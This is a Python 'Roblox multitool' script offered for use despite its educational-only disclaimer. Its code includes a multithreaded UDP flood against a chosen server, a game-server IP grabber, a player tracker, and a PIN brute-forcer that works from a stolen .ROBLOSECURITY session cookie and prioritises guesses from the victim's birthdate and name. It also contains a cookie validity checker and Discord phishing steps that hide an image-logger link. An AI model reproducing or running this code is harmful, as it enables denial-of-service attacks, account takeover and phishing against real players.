#505045329
import requests, time, sys, os

try:
 from adm4.main import *
except:
 print("Installing required packages, please wait.")
 os.system("pip install adm4 colorama robloxpy glob2 requests")    # Salty-Coder :)
 print("finished installing required packages please restart terminal.")

from colorama import *
import socket
import random
import glob
import threading
import robloxpy


close()
init()
print("Disclaimer of Liability applies, i  am not responisble for the actions you do. this software was made for educational purpose only")
time.sleep(5)
def main1():
   print("""  roblox server attack vectors
     [1] server ddoser (requires a team of people)
     [2] get roblox server ip:port
     [3] back 
    """)
   opt1 = input('  [K]/RSAV/>')
   if opt1 == '1':

         targetIP = input("  [K]/RSAV/targetIP> ")
         targetPORT = input("  [K]/RSAV/targetPORT> ")
         threads1 = input("  [K]/RSAV/threads> ")
         temps1 = input("  [K]/RSAV/temps> ")
         def minecraftsexptdr(ip,port,temps):
            timeout = time.time() + float(temps)
            udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            #rawsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sent = 0
            #taille du packet
            bytes = random._urandom(256)
            while True:
                           try:
                                    if time.time() > timeout :
                                             break
                                    else:
                                             pass
                                    ran = random.randrange(10**80)
                                    hex = "%064x" % ran
                                    hex = hex[:64] 
                                    udpsock.sendto(bytes.fromhex(hex) + bytes,(ip,int(port)))
                                    #rawsock.sendto(bytes.fromhex(hex) + bytes,(ip,int(port))) 
                                    sent = sent + 1
                                    if (random.randint(0,10000)) == 1:
                                     print(Back.RED + f"[{sent}]" + Back.BLACK + f" sent {sent} udp packets to {ip}:{port} ")
                                    else:
                                     pass
                           except KeyboardInterrupt:
                                    sys.exit(os.system("clear"))



            ip = targetIP
            port = int(targetPORT)
            threads = int(threads1)
            temps = int(temps1)
            for i in range(0, threads):
               thread = threading.Thread(target=minecraftsexptdr, args=(ip,port,temps))
               thread.start()

   elif opt1 == '2':
      username = os.getenv('username')
      print("""
      How to use:
      credit to Azure#0263 for the code.
      Join a Roblox game and wait until the game fully loads
      Press enter when you are ready to pull the IP!
      """)
      try:
         input("Press [ENTER] to grab the IP!")
      except SyntaxError:
         pass
      list_of_files = glob.glob(r'C:\users\{}\AppData\Local\Roblox\logs\*'.format(username))
      latest_file = max(list_of_files, key=os.path.getctime)
      roblox_log = open(latest_file, 'r')

      for line in roblox_log:
         if 'Connection accepted from' in line:
            line = line.replace('Connection accepted from', '')
            line2 = line.replace('|', ':')
            line3 = line2[25:]
            print("Server IP: " + line3)

            ip_history = open('server_ips.txt', 'a+')
            ip_history.write(line3 + "\n")
            ip_history.close()

      main1()
   elif opt1 == '3':
      menu()

##################################################################################################################

def main2():
   print("  roblox user infomation gathering ")

   usr = input("  [K]/RUIG/playerID>")
   res = requests.get(f"https://api.roblox.com/users/{usr}/onlinestatus/")
   a = res.json()
   onl = (a['IsOnline'])
   onl2 = (a['PresenceType'])
   loc1 = (a['LocationType'])
   gam = (a['LastLocation'].strip(' '))
   pla = (a['PlaceId'])
   lonl = (a['LastOnline'])
   loc2= 'nil'

   resp = requests.get(f"https://api.roblox.com/users/{usr}")
   b = resp.json()
   usn = (b['Username'])


   if loc1 == 0:
      loc2 = 'Mobile (Website)'
   elif loc1 == 1:
      loc2 = 'Mobile (Ingame)'
   elif loc1 == 2:
      loc2 = 'Computer (Website)'
   elif loc1 == 3:
      loc2 = 'Computer (Studio)'
   elif loc1 == 4:
      loc2 = 'Computer (Ingame)'
   elif loc1 == 5:
      loc2 = 'Xbox (Website/App)'
   elif loc1 == 6:
      loc2 = 'Computer (Studio w/ Team Create)'
   else:
      loc2 = 'cannot obtain'

   print(f"""
      ╭――――――――――――――――――――――――――――――――――――――――――――――――――――――――――╮
      │ username:        │ {usn}
      │ online:          │ {onl}
      │ location:        │ {loc2}
      │ Game:            │ {pla}
      │ LastOnline:      │ {lonl}
      ╰――――――――――――――――――――――――――――――――――――――――――――――――――――――――――╯

      """)
   input("  [K] exit")
   menu()


##################################################################################################################

def main3():
   print("""  roblox account exploit vectors
   [1] crack roblox account pin (slow as fuk)
   [2] check if cookie is valid 
   [3] back
   """)

   opt2 = input("  [K]/RAEV/>")
   if opt2 == 1:
      import os, time, requests
      from threading import Thread
      from datetime import datetime

      credentials = input('  [K]/RAEV/> Enter the account user:pass:cookie or cookie: ')
      if credentials.count(':') >= 2:
         username, password, cookie = credentials.split(':',2)
      else:
         username, password, cookie = '', '', credentials
      os.system('cls')

      req = requests.Session()
      req.cookies['.ROBLOSECURITY'] = cookie
      try:
         username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
         print('Logged in to', username)
      except:
         input('INVALID COOKIE')
         exit()

      common_pins = req.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
      pins = [pin.split(',')[0] for pin in common_pins.splitlines()]
      print('Loaded pins by commonality.')

      r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
      month = str(r['birthMonth']).zfill(2)
      day = str(r['birthDay']).zfill(2)
      year = str(r['birthYear'])

      likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
      likely = [x for x in likely if x.isdigit() and len(x) == 4]
      for pin in likely:
         pins.remove(pin)
         pins.insert(0, pin)
      print(f'Prioritized likely pins {likely}\n')

      tried = 0
      while 1:
         pin = pins.pop(0)
         os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
         try:
            r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
            if 'X-CSRF-TOKEN' in r.headers:
                  pins.insert(0, pin)
                  req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
            elif 'errors' in r.json():
                  code = r.json()['errors'][0]['code']
                  if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                     print(f'[FAILURE] Account cookie expired.')
                     break
                  elif code == 1:
                     print(f'[SUCCESS] NO PIN')
                     with open('pins.txt','a') as f:
                        f.write(f'NO PIN:{credentials}\n')
                     break
                  elif code == 3 or '"message":"TooManyRequests"' in r.text:
                     pins.insert(0, pin)
                     print(f'[{datetime.now()}] Sleeping for 5 minutes.')
                     time.sleep(60*5)
                  elif code == 4:
                     tried += 1
            elif 'unlockedUntil' in r.json():
                  print(f'[SUCCESS] {pin}')
                  with open('pins.txt','a') as f:
                     f.write(f'{pin}:{credentials}\n')
                  break
            else:
                  pins.insert(0, pin)
                  print(f'[ERROR] {r.text}')
         except Exception as e:
            print(f'[ERROR] {e}')
            pins.insert(0, pin)

      input()
   elif opt2 == '2':
      cookie = input("  [K]/RAEV/cookie/>")
      print(robloxpy.Utils.CheckCookie(Cookie=cookie))
      input("  [K] exit")
      menu()
   elif opt2 == '3':
      os.system("exit")


##################################################################################################################

def main4():
   print("""  phishing attack vectors
   
   1.  generate a phishing link that has a embed that looks like a img .ect pyphisher
   2.  paste this into discord ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _
   3.  add your phishing link afterwards ect .lol this exploit is awesome ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ https://en.wikipedia.org/wiki/Trollface
   4.  done u now have a "image logger"
   """)


##################################################################################################################

def main5():
   print("""  for help please join the administrators server
   
   discord.gg/bG39nNZwdD
   """)
   time.sleep(7)
   menu()


def main6():
   os.system("exit")



def menu():

   os.system('cls')
   print(Fore.LIGHTBLUE_EX + """
   ___      ___                  _     
  | _ \___ / __|___ _ _  ___ ___| |___ 
  |   / _ \ (__/ _ \ ' \(_-</ _ \ / -_)
  |_|_\___/\___\___/_||_/__/\___/_\___|
  simple roblox multitool -{karki edition}-

  [1] roblox server attack vectors            [4] phishing attack vectors
  [2] roblox user infomation gathering        [5] help 
  [3] roblox account exploit vectors          [6] exit

    """)
   opt = input("  [K]> ")
   if opt == '1':
      main1()
   elif opt == '2':
      main2()
   elif opt == '3':
      main3()
   elif opt == '4':
      main4()
   elif opt == '5':
      main5()
   elif opt == '6':
      main6()
   else:
      print("  [K] not an option ")
      time.sleep(4)
      menu()
   
menu()
